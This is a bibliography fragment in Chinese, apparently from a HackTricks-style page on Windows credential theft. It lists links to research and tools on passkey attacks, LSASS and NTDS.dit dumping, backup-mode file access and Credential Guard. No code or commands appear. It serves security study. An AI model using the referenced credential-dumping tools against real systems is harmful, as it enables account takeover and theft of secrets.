- [4] [Unit 42 – Pass the Passkey：无密码身份验证中的新型攻击面](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG 密钥存储](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows：Microsoft 系统与网络攻击](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory 数据存储的实际工作原理：深入了解 NTDS.dit（第 1 部分）](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - 远程转储 LSASS 密码](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho 使用 Still 工具包扩充其网络间谍工具库](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW 函数与 `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` 备份模式](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – 终止活动会话](https://telegram.org/faq)
- [14] [Microsoft Learn：Remote Credential Guard 与 Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn：凭据保护与管理](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz - 支持的输入与快速入门](https://github.com/nikaiw/VMkatz)
- [18] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
